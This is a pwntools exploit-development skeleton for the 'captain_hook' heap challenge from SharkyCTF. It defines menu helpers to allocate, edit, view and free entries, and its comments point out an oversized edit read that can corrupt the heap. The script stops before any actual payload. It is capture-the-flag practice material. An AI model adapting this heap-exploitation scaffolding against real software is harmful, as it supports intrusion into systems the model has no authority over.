from pwn import *
target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./captain_hook'],env={"LD_PRELOAD":"./libc-2.27.so"})
#target=remote('sharkyctf.xyz' ,20336)

context.terminal=["tmux","split","-h"]
#gdb.attach(target)
gdb.attach(target,gdbscript="pie breakpoint *(0x1008-0x203000)")

# iter from 0-3,id entry is 0,print ___, else print entry values.(name and age)
def list():
	print(target.recvuntil("peterpan@pwnuser:~$ "))
	target.sendline("1")

#check 0<=index<=3, check entry at index in array, malloc(0x44), fgets 1f bytes into allocmem(replace \n with null term),4 bytes of int at allocmem+0x20,0xb bytes into allocmem+0x24,fill entry at index in array.
def lock(index,name,age,date):
	print(target.recvuntil("peterpan@pwnuser:~$ "))
	target.sendline("2")
	print(target.recvuntil(": "))
	target.sendline(str(index))
	print(target.recvuntil(": "))
	target.send(name)
	print(target.recvuntil(": "))
	target.sendline(str(age))
	print(target.recvuntil(": "))
	target.sendline(date)

#check 0<=index<=3, check entry at index in array, print charname,age,date(if in correct format) 
def view(index):
	print(target.recvuntil("peterpan@pwnuser:~$ "))
	target.sendline("3")
	print(target.recvuntil(": "))
	target.sendline(str(index))

#check 0<=index<=3, check entry at index in array,fgets 7f bytes for name,4 bytes of int,0xa bytes for date,if name,age,date are different, change them,(only orig size) 
def edit(index,name,age,date):
	print(target.recvuntil("peterpan@pwnuser:~$ "))
	target.sendline("4")
	print(target.recvuntil(": "))
	target.sendline(str(index))
	print(target.recvuntil(": "))
	target.sendline(str(name))
	print(target.recvuntil(": "))
	target.sendline(str(age))
	print(target.recvuntil(": "))
	target.sendline(str(date))

#check 0<=index<=3, check entry at index in array, free allocmem at index in array, fill null at index in array.
def free(index):
	print(target.recvuntil("peterpan@pwnuser:~$ "))
	target.sendline("5")
	print(target.recvuntil(": "))
	target.sendline(str(index))

def quit():
	print(target.recvuntil("peterpan@pwnuser:~$ "))
	target.sendline("6")

lock(0,"A"*0x1e,123456,"B"*0xa)
target.interactive()
	
	
